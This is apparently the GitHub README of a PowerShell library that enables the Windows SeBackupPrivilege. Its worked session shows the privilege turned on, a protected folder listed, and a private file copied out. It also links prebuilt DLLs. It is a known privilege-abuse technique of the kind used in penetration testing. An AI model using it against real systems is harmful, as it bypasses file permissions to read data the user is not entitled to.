

    

# [![](data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' class='octicon octicon-link js-evernote-checked' viewBox='0 0 16 16' version='1.1' width='16' height='16' aria-hidden='true' data-evernote-id='44'%3e%3cpath fill-rule='evenodd' d='M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z' data-evernote-id='672' class='js-evernote-checked'%3e%3c/path%3e%3c/svg%3e)](https://github.com/giuliano108/SeBackupPrivilege#sebackupprivilege)SeBackupPrivilege

On Windows, if a user has the "[Back up files and directories](http://technet.microsoft.com/en-us/library/cc787956.aspx)" right, he gets assigned the `SE_BACKUP_NAME`/`SeBackupPrivilege`  [privilege](http://msdn.microsoft.com/en-us/library/windows/desktop/bb530716.aspx). Such privilege is disabled by default but when switched on it allows the user to access directories/files *that he doesn't own* or *doesn't have permission to*. In MSDN's own words:

> This user right determines which users can bypass file and directory, registry, and other persistent object permissions for the purposes of backing up the system.

In order to exploit `SeBackupPrivilege` you have to:

- Enable the privilege.

This alone lets you traverse (`cd` into) any1 directory, local or remote, and list (`dir`, `Get-ChildItem`) its contents.

- If you want to read/copy data out of a "normally forbidden" folder, you have to act as a backup software. The shell `copy` command won't work; you'll need to open the source file manually using `CreateFile` making sure to specify the `FILE_FLAG_BACKUP_SEMANTICS` flag.

This library exposes three PowerShell CmdLets that do just that.

## [![](data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' class='octicon octicon-link js-evernote-checked' viewBox='0 0 16 16' version='1.1' width='16' height='16' aria-hidden='true' data-evernote-id='45'%3e%3cpath fill-rule='evenodd' d='M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z' data-evernote-id='685' class='js-evernote-checked'%3e%3c/path%3e%3c/svg%3e)](https://github.com/giuliano108/SeBackupPrivilege#example-usage)Example usage

	PS C:\scripts> Import-Module .\SeBackupPrivilegeUtils.dll
	PS C:\scripts> Import-Module .\SeBackupPrivilegeCmdLets.dll
	PS C:\scripts> Get-SeBackupPrivilege # ...or whoami /priv | findstr Backup
	SeBackupPrivilege is disabled
	PS C:\scripts> dir E:\V_BASE
	Get-ChildItem : Access to the path 'E:\V_BASE' is denied.
	At line:1 char:4
	+ dir <<<<  E:\V_BASE
	    + CategoryInfo          : PermissionDenied: (E:\V_BASE:String) [Get-ChildItem], UnauthorizedAccessException
	    + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand

	PS C:\scripts> Set-SeBackupPrivilege
	PS C:\scripts> Get-SeBackupPrivilege
	SeBackupPrivilege is enabled
	PS C:\scripts> dir E:\V_BASE # ...having enabled the privilege, this now works

	    Directory: E:\V_BASE

	Mode                LastWriteTime     Length Name
	----                -------------     ------ ----
	d----        18/07/2013     13:04            Private

	PS C:\scripts> cd E:\V_BASE\Private
	PS E:\V_BASE\Private> dir

	    Directory: E:\V_BASE\Private

	Mode                LastWriteTime     Length Name
	----                -------------     ------ ----
	-----        05/07/2013     12:29     306435 report.pdf

	PS E:\V_BASE\Private> Copy-FileSeBackupPrivilege .eport.pdf c:\temp\x.pdf -Overwrite
	Copied 306435 bytes

	PS E:\V_BASE\Private>

## [![](data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' class='octicon octicon-link js-evernote-checked' viewBox='0 0 16 16' version='1.1' width='16' height='16' aria-hidden='true' data-evernote-id='46'%3e%3cpath fill-rule='evenodd' d='M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z' data-evernote-id='687' class='js-evernote-checked'%3e%3c/path%3e%3c/svg%3e)](https://github.com/giuliano108/SeBackupPrivilege#buildingmisc)Building/misc

The following dlls are compiled for x64, .NET Framework 2.0 . If they don't match your environment, you'll have to build your own; just import the project into [SharpDevelop](http://www.icsharpcode.net/opensource/sd/) and you should be good to go.

- [SeBackupPrivilegeUtils.dll](https://github.com/giuliano108/SeBackupPrivilege/blob/master/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeUtils.dll?raw=true)
- [SeBackupPrivilegeCmdLets.dll](https://github.com/giuliano108/SeBackupPrivilege/blob/master/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeCmdLets.dll?raw=true)

These resources have been extremely helpful when putting this stuff together:

- Stack Overflow: [How to detect if "Debug Programs" Windows privilege is set?](http://stackoverflow.com/questions/4880197/how-to-detect-if-debug-programs-windows-privilege-is-set)
- Stack Overflow: [Setting size of TOKEN_PRIVILEGES.LUID_AND_ATTRIBUTES array returned by GetTokenInformation](http://stackoverflow.com/questions/4349743/setting-size-of-token-privileges-luid-and-attributes-array-returned-by-gettokeni)
- [Adjusting Token Privileges in PowerShell](http://www.leeholmes.com/blog/2010/09/24/adjusting-token-privileges-in-powershell/)
- [PInvoke.net](http://www.pinvoke.net/)

* * *

[1] Explicit denies should still block you, though...